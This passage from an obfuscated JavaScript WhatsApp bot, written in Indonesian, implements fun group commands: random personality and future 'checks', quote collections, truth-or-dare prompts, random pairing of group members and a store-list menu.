            return _0x3a091f("Kirim/Reply Gambar Husbu Kamu Dengan Caption *" + (_0x4773c6 + _0x4ac520) + '*');
          }
          if (!_0x3df746) {
            return _0x3a091f("Kirim/Reply Gambar Husbu Kamu Dengan Caption *" + (_0x4773c6 + _0x4ac520) + '*');
          }
          const _0x5a731e = Math.floor(Math.random() * 0x64) + 0x1;
          const _0x598916 = _0x5a731e > 0x50 ? "😍 Husbu terbaik sepanjang masa!" : _0x5a731e > 0x32 ? "😊 Lumayan jadi husbu idaman!" : "😬 Ehm, mungkin Husbu-nya butuh upgrade dikit...";
          _0x3a091f("💖 *Cek Husbu*\n\nPersentase husbu Kamu adalah *" + _0x5a731e + "%*\n" + _0x598916);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "cekkpribadian":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x29bf90 = ["🧠 Cerdas dan bijaksana.", "❤️ Penuh kasih sayang dan perhatian.", "🔥 Bersemangat dan penuh energi.", "🎭 Misterius dan sulit ditebak.", "😄 Ramah dan menyenangkan.", "😎 Cool dan tenang dalam segala situasi.", "😅 Sering baperan, tapi baik hati."];
          const _0x50e14e = _0x29bf90[Math.floor(Math.random() * _0x29bf90.length)];
          _0x3a091f("🪄 *Cek Kepribadian*\n\nKamu memiliki kepribadian:\n" + _0x50e14e);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "cekmasadepan":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x485164 = ["💼 Akan jadi bos besar di perusahaan ternama!", "🏝️ Pensiun muda dan tinggal di pulau tropis.", "💖 Akan menemukan cinta sejati dalam waktu dekat.", "📚 Akan jadi orang yang sangat berilmu dan dihormati.", "💸 Kaya raya dengan bisnis sukses!", "🎭 Masa depan Kamu penuh misteri dan kejutan!", "😴 Hmm... masa depan Kamu masih kabur, coba lagi nanti."];
          const _0x205cff = _0x485164[Math.floor(Math.random() * _0x485164.length)];
          _0x3a091f("🔮 *Cek Masa Depan*\n\nRamalan masa depan Kamu:\n" + _0x205cff);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "quotesprogrammer":
        {
          const _0x100658 = ["Code sekali jalan, selamanya error. 🔥", "Kalau bisa copy-paste, kenapa harus mikir? 😎", "Bug bukan kesalahan, tapi fitur tersembunyi. 😉", "Kode jelek yang jalan lebih baik daripada kode sempurna yang nggak jadi. 🤡", "Dokumentasi? Itu makanan apa? 🤔", "Saya tidak pernah membuat bug, hanya menciptakan kejutan di kode. 🎁", "Stack Overflow adalah separuh dari otak saya. 🧠", "Kalau nggak ada deadline, programmer nggak akan kerja. ⏳", "Refactor besok aja, yang penting sekarang jalan! 🚀", "Debugging: proses mencari tahu kenapa kode nggak jalan setelah yakin pasti jalan. 🤯", "Kodeku jalan? Aku nggak percaya. 💀", "Logic sederhana itu untuk newbie, kita yang pro suka suffering. 😆", "Kode yang bersih itu mitos, yang penting klien nggak komplain. 🤫", "Programmer sejati itu: edit 1 baris, error 99+. 🎭", "Ketika bos bilang 'cuma edit dikit', tandanya harus rewrite semuanya. 😤", "Ngoding dari jam 9 malam sampai subuh, errornya baru ketahuan pas siang. 🌙☀️", "Kasus klasik: 'harusnya ini nggak mungkin error'... tapi tetep error. 💀", "Sistem sudah stabil… sampai ada user yang nyoba hal aneh. 😭", "Koding itu gampang, kalau tau caranya… sayangnya nggak ada yang tau. 🤣", "Programmer itu magician modern: bikin sesuatu dari ketiadaan (dan error). 🎩✨", "Kalau nggak ada deadline, kode ini nggak akan pernah selesai. ⏳", "Programmer itu makhluk yang bisa bikin aplikasi canggih, tapi males bales chat. 📵", "Kode itu kayak cinta, kalau dipaksa malah error. 💔", "Tiap kali aku bilang 'udah fix', besoknya ada bug baru. 😵‍💫", "Kode jalan di lokal, tapi error di production. Selalu. 😭", "Kenapa bug lebih cepat berkembang daripada fitur baru? 🐞", "Junior takut nulis kode, senior takut baca kode lama. 🤣", "Programming itu kayak main game horror, tiap buka file kode pasti takut. 👻", "Kode lama itu suci, karena tidak ada yang berani menyentuhnya. 🙏", "Coding itu 1% menulis kode, 99% nyari tahu kenapa nggak jalan. 🔍", "Feature request klien: 'Tinggal tambah tombol doang'. 🚩🚩🚩", "Habis bikin sistem baru, besoknya ada yang minta fitur tambahan. 😤", "Semua error bisa diperbaiki… kecuali error di otak sendiri. 🧠", "Ada dua jenis programmer: yang ngerti kode sendiri, dan yang pura-pura ngerti. 🤡", "Orang biasa liat film buat hiburan, programmer baca dokumentasi. 📖", "Manager: 'Cuma ubah warna dikit', realitanya harus ngubah setengah kode. 🎨", "User: 'Aplikasi lambat nih', padahal pakai HP kentang. 🥔", "Kodeku mungkin berantakan, tapi setidaknya lebih rapi dari hidupku. 😌", "Menulis kode itu seni, debugging itu kriminal. 🚔", "Bukan aku yang salah, ini pasti salah compiler-nya. 😤", "Kode yang jalan di localhost belum tentu jalan di dunia nyata. 🌍", "Gajinya software engineer gede, tapi tetep harus debug jam 2 pagi. 😩", "Hidupku cuma ada dua mode: coding atau ngeluh tentang coding. 🔄", "Bug terbesar dalam sistem ini adalah aku sendiri. 💀", "Kamu tahu itu kode lama kalau orang yang nulisnya sudah resign. 👀", "Buat bug itu gampang, yang susah adalah pura-pura nggak lihat. 🤭", "Skill utama programmer bukan coding, tapi Googling. 🔎", "Kalau program jalan di first try, pasti ada sesuatu yang salah. 🚨", "Semua kode itu bagus… sampai kita baca ulang besoknya. 😅", "Programmer sejati baru kerja kalau deadline udah di depan mata. ⏳", "Error di komputer masih bisa diperbaiki, error di hidup siapa yang tanggung jawab? 🤔", "Salah satu skill penting programmer: bisa nyalahin orang lain. 🔥", "Code review itu cara sopan buat bilang: 'Ini apaan sih?!' 😆", "Komentar di kode itu buat masa depan, yang sayangnya nggak akan pernah datang. 📜", "Programmer yang baik itu bukan yang nggak bikin bug, tapi yang bisa ngeles pas bug muncul. 😜", "Ngoding itu seperti memasak… kalau nggak hati-hati, semuanya bakal berantakan. 🍳", "Tingkat stres tertinggi: ketika bug hilang tanpa alasan. 😨", "Programmer nggak pernah tidur, mereka cuma nge-loop ke mode standby. 🔄", "Kamu tahu jadi programmer itu berat kalau satu-satunya teman ngobrolmu adalah console.log(). 🤖"];
          const _0x34d5d4 = _0x100658[Math.floor(Math.random() * _0x100658.length)];
          _0x3f87c6.reply(_0x34d5d4);
        }
        ;
        break;
      case "quotesgalau":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x22361a = ["💔 \"Kadang, diam adalah cara terbaik untuk menyampaikan betapa sakitnya hati ini.\"", "🥀 \"Kamu tau yang lebih sakit dari patah hati? Berjuang sendirian untuk hubungan yang berdua.\"", "😔 \"Aku baik-baik saja, cuma kadang capek pura-pura kuat.\"", "💬 \"Kamu adalah alasan senyumku, tapi juga alasan air mataku.\"", "🌧️ \"Hujan tahu bagaimana caranya menangis tanpa suara, sama sepertiku.\"", "💔 \"Cinta yang terpendam lebih menyakitkan daripada cinta yang terungkap.\"", "🖤 \"Kadang, kita harus melepaskan orang yang kita cinta untuk menemukan kebahagiaan.\"", "🌹 \"Aku lebih suka diam, daripada menyakiti hati dengan kata-kata.\"", "😭 \"Kamu pergi, tapi kenangan tetap bertahan.\"", "💧 \"Air mata ini bukan karena kebodohan, tapi karena hati yang terlalu berharap.\"", "🥀 \"Aku tahu kita sudah tidak sama lagi, tapi kenapa masih terasa seperti dulu?\"", "💔 \"Menyayangimu adalah bagian terbaik dalam hidupku, dan juga bagian terburuk.\"", "🌧️ \"Aku menunggu hujan reda, tapi hatiku tetap basah.\"", "🌸 \"Tidak ada yang lebih menyakitkan daripada merindukan seseorang yang sudah tidak peduli lagi.\"", "💭 \"Aku terjebak dalam kenangan yang tak pernah bisa kembali.\"", "🌙 \"Kadang aku bertanya-tanya, apakah Kamu merindukanku seperti aku merindukanmu?\"", "💘 \"Mencintaimu bukan keputusan, itu adalah takdir yang sulit untuk diterima.\"", "🖤 \"Aku mencoba untuk melupakanmu, tapi semakin aku berusaha, semakin dalam luka ini.\"", "💔 \"Cinta itu indah, tapi sering kali menyakitkan ketika harus berakhir.\"", "🌙 \"Kepergianmu seperti bintang yang hilang di langit malam, tak pernah tergantikan.\"", "😢 \"Sakit itu datang ketika kita menginginkan sesuatu yang tidak bisa kita miliki.\"", "💔 \"Hidup ini penuh dengan keputusan, dan aku salah memilih untuk mencintaimu.\"", "🖤 \"Aku belajar, bahwa terkadang mencintai itu lebih menyakitkan daripada melepaskan.\"", "🥀 \"Kamu adalah luka yang tak pernah sembuh, tapi tetap ku pertahankan di hati.\"", "🌧️ \"Hujan bukan hanya dari langit, tapi juga dari hatiku yang sedang merindu.\"", "💘 \"Setiap kali aku mencoba melupakanmu, aku malah semakin terikat dengan kenangan kita.\"", "💔 \"Aku tak tahu kapan cinta kita mulai pudar, tapi aku merasa kehilanganmu setiap hari.\"", "💭 \"Apa yang bisa aku lakukan jika hatiku masih berharap pada sesuatu yang sudah tidak ada?\"", "🌙 \"Aku berusaha mengerti, tapi kadang hati ini tak mampu menerima kenyataan.\"", "💖 \"Terkadang, kehilangan itu mengajarkan kita untuk lebih menghargai apa yang telah hilang.\"", "🌹 \"Kamu pergi dan aku tetap di sini, terjebak dalam kenangan yang tak pernah bisa kembali.\"", "🖤 \"Aku terus mencari jawaban, tapi semakin aku mencarinya, semakin aku bingung.\"", "💔 \"Kenangan kita selalu muncul, meski aku mencoba untuk melupakan semuanya.\"", "🌧️ \"Cinta itu seperti hujan, datang tanpa diundang, tapi meninggalkan luka setelahnya.\"", "💭 \"Rasa ini mengalahkan segalanya, bahkan akal sehatku.\"", "🌙 \"Aku bertanya-tanya, apakah Kamu pernah merasakan sakit yang sama seperti yang aku rasakan?\"", "💘 \"Ketika cinta berubah menjadi kenangan, yang bisa kita lakukan hanyalah menangis diam-diam.\"", "🖤 \"Aku mencintaimu, tapi terkadang cinta itu harus disertai dengan keberanian untuk melepaskan.\""];
          const _0x8bcf14 = _0x22361a[Math.floor(Math.random() * _0x22361a.length)];
          _0x3a091f("💔 *Quotes Galau*\n\n" + _0x8bcf14);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "quotesislami":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x431975 = ["🌙 \"Sesungguhnya setelah kesulitan ada kemudahan, percayalah pada janji Allah.\"", "🕋 \"Dan berdoalah kepada-Ku, niscaya akan Aku kabulkan untukmu.\" (QS. Ghafir:60)", "💫 \"Hidup ini penuh ujian, namun Allah tidak akan memberikan ujian yang melebihi kemampuan hamba-Nya.\"", "🌹 \"Ketika Kamu merasa lelah, ingatlah Allah selalu bersama orang-orang yang sabar.\"", "🌱 \"Doa adalah senjata orang beriman, dan dengan doa, kita bisa mengubah takdir.\"", "🌙 \"Jangan pernah merasa sendirian, karena Allah selalu mendengarkan setiap doa dan keluhanmu.\"", "✨ \"Setiap ujian dalam hidup adalah cara Allah menunjukkan kasih sayang-Nya.\"", "💖 \"Cinta Allah adalah cinta yang tak pernah mengecewakan. Bersandarlah pada-Nya.\"", "🕌 \"Ingatlah, bahwa setiap langkah kita menuju Allah akan dimudahkan-Nya.\"", "🌟 \"Bersyukurlah atas segala yang ada, karena setiap nikmat yang Allah berikan adalah anugerah.\"", "🕋 \"Allah tidak akan mengubah keadaan suatu kaum, kecuali mereka mengubah apa yang ada pada diri mereka sendiri.\" (QS. Ar-Ra’d:11)", "💫 \"Jangan pernah khawatir tentang masa depan, karena Allah sudah menyiapkan yang terbaik untukmu.\"", "🌹 \"Kesabaran adalah kunci dari segala kemudahan, dan Allah pasti memberikan jalan keluar.\"", "🕊️ \"Hidup di dunia hanya sementara, jadikan setiap langkah menuju akhirat penuh dengan kebaikan.\"", "🌱 \"Tawakal kepada Allah setelah berusaha, karena Dia Maha Mengetahui apa yang terbaik untuk hamba-Nya.\"", "💖 \"Sahabat terbaik dalam hidup ini adalah mereka yang mengingatkan kita pada Allah.\"", "🕋 \"Jangan pernah putus asa, Allah selalu bersama orang-orang yang sabar.\" (QS. Al-Anfal:46)", "🌙 \"Setiap doa yang dipanjatkan dengan tulus, pasti akan sampai pada-Nya, karena Allah Maha Mendengar.\"", "✨ \"Keikhlasan dalam setiap amal akan mendekatkan kita pada cinta dan ridha Allah.\"", "🌟 \"Jika Kamu merasa lemah, ingatlah bahwa Allah selalu ada untuk memberikan kekuatan.\"", "🕌 \"Bersabarlah, karena Allah bersama orang-orang yang sabar.\" (QS. Al-Baqarah:153)", "💭 \"Sesungguhnya Allah tidak membebani seseorang melainkan sesuai dengan kesanggupannya.\" (QS. Al-Baqarah:286)", "🌺 \"Jangan menyerah, Allah selalu memberikan yang terbaik untuk hamba-Nya yang bersabar.\"", "💖 \"Cinta yang sejati adalah cinta yang mengingatkan kita pada Allah dan Rasul-Nya.\"", "✨ \"Tunggu jawaban terbaik dari Allah, karena Dia selalu memberi yang terbaik pada waktu yang tepat.\"", "🌙 \"Beriman dan bertawakal pada Allah adalah cara terbaik untuk meraih ketenangan hati.\""];
          const _0x16f1b0 = _0x431975[Math.floor(Math.random() * _0x431975.length)];
          _0x3a091f("🌙 *Quotes Islami*\n\n" + _0x16f1b0);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'quotespsikologi':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x30f941 = ["🧠 \"Kekuatan terbesar yang dimiliki manusia adalah kemampuan untuk mengendalikan pikirannya.\" - Buddha", "🌱 \"Pikiran kita membentuk dunia kita. Jika kita ingin perubahan dalam hidup, kita harus mulai dengan pikiran.\"", "💭 \"Jangan biarkan masa lalu mengendalikan masa depanmu. Kamu memiliki kekuatan untuk mengubahnya sekarang.\"", "💡 \"Perubahan dimulai dari dalam diri kita, dan itu terjadi ketika kita memilih untuk melihat dunia dengan cara yang berbeda.\"", "✨ \"Bukan berapa kali Kamu jatuh yang menentukan, tapi berapa kali Kamu bangkit setelahnya.\"", "🌸 \"Kebahagiaan tidak datang dari luar, tetapi dari cara kita merespon apa yang terjadi di dalam diri kita.\"", "🧘 \"Kesehatan mental itu penting, dan menjaga pikiran sama pentingnya dengan menjaga tubuh.\"", "🔑 \"Ketika Kamu berhenti menginginkan yang tidak bisa Kamu kontrol, Kamu akan menemukan kedamaian.\"", "🌻 \"Cobalah untuk tidak terlalu keras pada dirimu sendiri, Kamu sudah berusaha dengan baik.\"", "🎯 \"Kehidupan ini penuh dengan ketidakpastian, dan cara kita meresponnya adalah kunci untuk kebahagiaan.\"", "💬 \"Kesulitan yang Kamu hadapi sekarang adalah jembatan menuju kekuatan yang lebih besar.\"", "🌙 \"Jika Kamu merasa terjebak, ingatlah bahwa Kamu memiliki kemampuan untuk berubah kapan saja.\"", "🧠 \"Kendalikan pikiranmu, dan Kamu akan mengendalikan hidupmu.\"", "🌱 \"Sukses sejati bukanlah pencapaian materi, tapi kedamaian dalam hati dan pikiran.\"", "💭 \"Self-compassion adalah kunci untuk membebaskan diri dari tekanan dan rasa bersalah.\"", "🌟 \"Pikiran positif bukan hanya tentang melihat hal baik, tetapi tentang memahami bahwa setiap tantangan adalah kesempatan.\"", "💡 \"Perjalanan untuk memahami diri sendiri adalah perjalanan terindah yang akan membawa ketenangan batin.\"", "🌸 \"Belajarlah untuk menerima dirimu apa adanya, karena hanya dengan itu Kamu bisa berkembang.\"", "✨ \"Keberanian bukanlah tanpa rasa takut, tapi kemampuan untuk terus maju meskipun takut.\"", "🌻 \"Cinta pada diri sendiri adalah langkah pertama untuk bisa mencintai orang lain dengan tulus.\"", "💭 \"Ketika kita berhenti mengejar kebahagiaan, kita justru mulai menemukannya dalam hidup sehari-hari.\"", "🧘 \"Penerimaan diri adalah dasar dari kesehatan mental yang baik.\"", "🎯 \"Perubahan dimulai dengan keputusan untuk melihat segala sesuatu dengan cara yang lebih positif.\"", "💡 \"Kesalahan adalah bagian dari proses belajar, dan setiap langkah kecil membawa kita lebih dekat pada tujuan.\"", "🌙 \"Jangan biarkan ketakutan menghalangi potensimu. Ketakutan hanya akan mengecilkan langkahmu.\"", "🧠 \"Tidak ada yang salah dengan merasa tidak baik-baik saja. Yang penting adalah bagaimana Kamu bangkit dari situasi tersebut.\""];
          const _0x2454b6 = _0x30f941[Math.floor(Math.random() * _0x30f941.length)];
          _0x3a091f("💭 *Quotes Psikologi*\n\n" + _0x2454b6);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'bisa':
        {
          if (!_0x2b2627) {
            return _0x3a091f("Tanyakan sesuatu dong~\n\nContoh: " + (_0x4773c6 + _0x4ac520) + " aku belajar coding?");
          }
          let _0x3d4b89 = ["Bisa banget!", "Hmm, kayaknya enggak bisa deh.", "Nggak mungkin, maaf ya.", "Tentu saja Kamu bisa!!! Ayo semangat!"];
          let _0x457ab7 = _0x3d4b89[Math.floor(Math.random() * _0x3d4b89.length)];
          let _0x4e04f9 = "*Bisa " + _0x2b2627 + "*\nJawabanku: " + _0x457ab7;
          await _0x3a091f(_0x4e04f9);
        }
        break;
      case "apakah":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Yuk tanyakan sesuatu!\n\nContoh: " + (_0x4773c6 + _0x4ac520) + " dia jodohku?");
          }
          let _0x1cf0d7 = ['Iya', "Tidak", "Mungkin aja sih", "Bener banget tuh!"];
          let _0x27c36b = _0x1cf0d7[Math.floor(Math.random() * _0x1cf0d7.length)];
          let _0x925ad3 = "*Apakah " + _0x2b2627 + "*\nJawabanku: " + _0x27c36b;
          await _0x3a091f(_0x925ad3);
        }
        break;
      case "kapan":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Hmm, kapan ya? Yuk tanya detail!\n\nContoh: " + (_0x4773c6 + _0x4ac520) + " aku jadi sukses?");
          }
          let _0x1c8e22 = ["5 hari lagi", "10 hari lagi", "15 hari lagi", "1 bulan lagi", "3 bulan lagi", "1 tahun lagi", "Besok!", "Lusa!", "Nggak lama lagi kok!"];
          let _0x19c386 = _0x1c8e22[Math.floor(Math.random() * _0x1c8e22.length)];
          let _0x11f650 = "*Kapan " + _0x2b2627 + "*\nJawabanku: " + _0x19c386;
          await _0x3a091f(_0x11f650);
        }
        break;
      case "apa":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Coba tanyain dong, aku penasaran juga!\n\nContoh: " + (_0x4773c6 + _0x4ac520) + " makanan favoritmu?");
          }
          let _0x8ae3ef = ["Tanya pacarmu deh!", "Aku nggak tahu, serius.", "Hmm, coba cari tahu sendiri ya!"];
          let _0x48a7e4 = _0x8ae3ef[Math.floor(Math.random() * _0x8ae3ef.length)];
          let _0x1ae51c = "*Apa " + _0x2b2627 + "*\nJawabanku: " + _0x48a7e4;
          await _0x3a091f(_0x1ae51c);
        }
        break;
      case "dimana":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Lokasinya di mana ya? Coba tanyain aku!\n\nContoh: " + (_0x4773c6 + _0x4ac520) + " letak rumahku?");
          }
          let _0x36c60d = ["Di gunung", "Di Mars", "Di hatimu~", "Di hutan belantara", "Coba tanya mamamu.", "Rahasia dong!"];
          let _0xa245cc = _0x36c60d[Math.floor(Math.random() * _0x36c60d.length)];
          let _0x266b7f = "*Di mana " + _0x2b2627 + "*\nJawabanku: " + _0xa245cc;
          await _0x3a091f(_0x266b7f);
        }
        break;
      case "bagaimana":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Ceritain dong, biar aku bisa bantu!\n\nContoh: " + (_0x4773c6 + _0x4ac520) + " cara bikin bot?");
          }
          let _0x13aa8d = ["Hmm, coba cari di Google ya.", "Kayaknya susah deh.", "Ayo semangat! Kamu pasti bisa kok.", "Maaf, aku nggak tahu jawabannya.", "Wah, seriusan nanya itu? 🤔"];
          let _0x51248c = _0x13aa8d[Math.floor(Math.random() * _0x13aa8d.length)];
          let _0x916b30 = "*Bagaimana " + _0x2b2627 + "*\nJawabanku: " + _0x51248c;
          await _0x3a091f(_0x916b30);
        }
        break;
      case 'nilai':
        {
          if (!_0x2b2627) {
            return _0x3a091f("Aku kasih nilai nih, tanya aja!\n\nContoh: " + (_0x4773c6 + _0x4ac520) + " tampangku?");
          }
          let _0x51974b = Array.from({
            'length': 0x64
          }, (_0x1f913a, _0x4c66e3) => (_0x4c66e3 + 0x1).toString());
          let _0x4e049a = _0x51974b[Math.floor(Math.random() * _0x51974b.length)];
          let _0x4e9ec3 = "*Nilai untuk " + _0x2b2627 + "*\nJawabanku: " + _0x4e049a + '%';
          await _0x3a091f(_0x4e9ec3);
        }
        break;
      case "jodohku":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Fitur ini cuma bisa dipakai di grup, ya!");
          }
          let _0x212f4a = _0x1c92e6.map(_0x4a3224 => _0x4a3224.id);
          let _0x3d3997 = _0x3f87c6.sender;
          let _0x324923 = _0x212f4a[Math.floor(Math.random() * _0x212f4a.length)];
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "👫 Jodohmu adalah...\n@" + _0x3d3997.split('@')[0x0] + " ❤️ @" + _0x324923.split('@')[0x0] + "\nWah, cocok banget nih!",
            'contextInfo': {
              'mentionedJid': [_0x3d3997, _0x324923],
              'forwardingScore': 0xf423f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterName': saluranName,
                'newsletterJid': saluran
              },
              'externalAdReply': {
                'showAdAttribution': true,
                'title': botName,
                'mediaType': 0x1,
                'previewType': 0x1,
                'body': ownerName,
                'thumbnailUrl': imageUrl,
                'renderLargerThumbnail': false,
                'mediaUrl': wagc,
                'sourceUrl': wagc
              }
            }
          });
        }
        break;
      case 'pasangan':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Fitur ini cuma bisa dipakai di grup ya, sabar!");
          }
          let _0x57e7e6 = _0x1c92e6.map(_0x2f53a5 => _0x2f53a5.id);
          let _0x49e4c0 = _0x57e7e6[Math.floor(Math.random() * _0x57e7e6.length)];
          let _0x2a21fe = _0x57e7e6[Math.floor(Math.random() * _0x57e7e6.length)];
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': '@' + _0x49e4c0.split('@')[0x0] + " ❤️ @" + _0x2a21fe.split('@')[0x0] + "\nWah, ada apa nih? Cocok banget nih! 💖",
            'contextInfo': {
              'mentionedJid': [_0x49e4c0, _0x2a21fe],
              'forwardingScore': 0xf423f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterName': saluranName,
                'newsletterJid': saluran
              },
              'externalAdReply': {
                'showAdAttribution': true,
                'title': botName,
                'mediaType': 0x1,
                'previewType': 0x1,
                'body': ownerName,
                'thumbnailUrl': imageUrl,
                'renderLargerThumbnail': false,
                'mediaUrl': wagc,
                'sourceUrl': wagc
              }
            }
          });
        }
        ;
        break;
      case "truth":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x3e4755 = ["😈 Apa rahasia terbesar yang belum pernah Kamu ceritakan ke siapa pun?", "🤭 Siapa orang yang diam-diam Kamu suka saat ini?", "🫣 Pernah bohong sama sahabat sendiri? Tentang apa?", "👀 Hal paling memalukan yang pernah Kamu alami?", "💬 Kalau bisa kembali ke masa lalu, apa yang ingin Kamu ubah?", "👀 Apa yang selalu Kamu sembunyikan dari teman-temanmu?", "😶 Apa yang paling Kamu takuti dalam hidup ini?", "🤔 Hal apa yang Kamu sesali tapi tidak bisa diperbaiki?", "🤐 Pernah melakukan sesuatu yang Kamu tidak ingin orang lain tahu?", "😱 Kalau Kamu bisa tahu satu rahasia besar dari seseorang, siapa yang Kamu pilih?", "💭 Apa yang membuatmu merasa sangat cemas atau takut?", "🙈 Apa hal terburuk yang pernah Kamu lakukan di masa remaja?", "👁️ Apa hal yang paling Kamu banggakan tentang dirimu sendiri?", "📚 Ada gak keputusan besar dalam hidupmu yang Kamu sesali?", "🧐 Apa yang akan Kamu lakukan jika tahu Kamu hanya punya 1 hari lagi hidup?", "🤐 Ada gak hal yang Kamu sembunyikan dari orang yang sangat dekat denganmu?", "💔 Apa yang pernah membuatmu patah hati?", "🌑 Apa hal yang Kamu sangat takuti tetapi tidak ingin orang lain tahu?", "🔒 Apa yang Kamu sembunyikan dari keluarga Kamu?", "💭 Apakah ada keputusan besar yang Kamu ambil dengan menyesal?", "🛑 Apa kebiasaan buruk yang sulit Kamu tinggalkan?", "🤯 Apakah ada sesuatu yang Kamu ingin katakan pada seseorang, tetapi Kamu selalu takut untuk mengatakannya?", "🙈 Apa yang selalu membuatmu merasa cemas sebelum tidur?", "🎭 Siapa yang paling Kamu khawatirkan akan melukai perasaanmu?", "🎥 Apa film yang paling menggambarkan hidupmu sejauh ini?", "📜 Apa tujuan hidupmu yang paling penting menurutmu?"];
          const _0x53ac1e = _0x3e4755[Math.floor(Math.random() * _0x3e4755.length)];
          _0x3a091f("🤔 *Truth*\n\n" + _0x53ac1e);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "dare":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x575dd3 = ["🔥 Kirim chat \"Aku suka Kamu\" ke kontak terakhir yang Kamu chat!", "😜 Kirim voice note bilang \"Aku adalah manusia paling lucu sedunia.\"", "🤡 Foto selfie dengan ekspresi wajah paling aneh dan kirim ke grup!", "🕺 Kirim video Kamu joget lagu favorit selama 10 detik.", "📸 Post story IG dengan caption \"Aku lagi kena dare nih, tolong selamatkan!\"", "🎤 Nyanyikan lagu favoritmu dan kirimkan ke teman!", "🤳 Ambil foto dengan ekspresi paling serius dan kirimkan ke grup!", "🎮 Mainkan game di ponselmu selama 5 menit dan kirimkan tangkapan layar score tertinggi!", "📱 Kirim pesan ke mantanmu yang isinya hanya \"Hai!\"", "💃 Cobalah joget gaya bebas selama 20 detik dan kirim video ke grup!", "📸 Foto makananmu dan kirim ke teman dengan caption \"Ini yang aku makan hari ini, lapar banget!\"", "🖋️ Tulis pesan di papan tulis atau kertas dengan tulisan besar \"Aku lagi kena dare!\" dan kirim fotonya!", "🌍 Video diri Kamu jalan mundur selama 15 detik dan kirim ke grup!", "📱 Ganti foto profilmu dengan gambar lucu selama 1 jam!", "🥳 Berpura-puralah menjadi karakter kartun selama 1 menit dan kirimkan video ke grup!", "🥴 Coba lakukan mimik wajah yang paling kocak dan kirim ke teman-temanmu!", "🎧 Dengarkan lagu yang sangat Kamu benci selama 5 menit dan ceritakan perasaanmu setelah itu!", "🎬 Rekam video diri Kamu berbicara tentang topik acak selama 1 menit dan kirim ke grup!", "🎤 Cobalah untuk menyanyi lagu yang Kamu tidak kuasai selama 30 detik!", "🖼️ Gambar wajahmu di atas kertas dengan tangan kiri, lalu kirim fotonya!", "🕶️ Ambil foto dengan pakaian paling konyol yang Kamu punya dan kirim ke grup!", "📲 Kirimkan emoji yang paling mencerminkan dirimu ke grup!", "🎨 Buat gambar dengan benda-benda yang ada di sekitar Kamu, kirim foto hasilnya!", "🤩 Berpura-pura menjadi selebritas selama 2 menit dan rekam video!", "🎁 Beli sesuatu yang tidak pernah Kamu butuhkan dan tunjukkan pada teman-teman!", "🤳 Video dirimu melakukan tantangan dengan tangan di atas kepala selama 1 menit!", "🍕 Ambil foto makanan cepat saji dan caption \"Makan malam ala anak gaul!\"", "🎵 Kirim lagu yang membuatmu teringat seseorang ke grup!", "🔄 Ubah status WhatsApp dengan kata-kata yang sangat random selama 2 jam!"];
          const _0x3117ff = _0x575dd3[Math.floor(Math.random() * _0x575dd3.length)];
          _0x3a091f("😈 *Dare*\n\n" + _0x3117ff);
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'list':
      case 'store':
        {
          try {
            const _0x43a01f = Object.keys(db.data.chats[_0x3f87c6.chat].liststore);
            if (_0x43a01f.length === 0x0) {
              return _0x3a091f("Yah, sepertinya belum ada list yang tersedia di grup ini. 😔");
            }
            let _0x51e246 = "Halo @" + _0x3f87c6.sender.split('@')[0x0] + "! 🎉 Ini dia beberapa list yang bisa Kamu cek sekarang. Yuk, pilih yang Kamu suka! 🛍️\n\n";
            const _0x2ddc59 = [];
            const _0x4f3fa1 = [];
            _0x43a01f.forEach(_0x5f3b0d => {
              _0x2ddc59.push({
                'key': _0x5f3b0d
              });
              _0x4f3fa1.push({
                'header': _0x3b018a(_0x5f3b0d) + " 🛒",
                'title': "Klik untuk melihat produk",
                'id': _0x5f3b0d
              });
            });
            let _0x2f2dab = [{
              'name': "single_select",
              'buttonParamsJson': "{\n\t\t\t\t\t\t\t\"title\": \"Store List 🛍️\",\n\t\t\t\t\t\t\t\"sections\": [{\n\t\t\t\t\t\t\t\t\"title\": \"Eksplorasi Semua Store Official 🔥\",\n\t\t\t\t\t\t\t\t\"highlight_label\": \"New\",\n\t\t\t\t\t\t\t\t\"rows\": " + JSON.stringify(_0x4f3fa1) + "\n\t\t\t\t\t\t\t}]\n\t\t\t\t\t\t}"
            }];
            _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x2f2dab, _0x51e246, footer, _0x3f87c6);
          } catch (_0x28145a) {
            console.log(_0x28145a);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "dellist":
        {
          if (!_0x3f87c6.isGroup) {
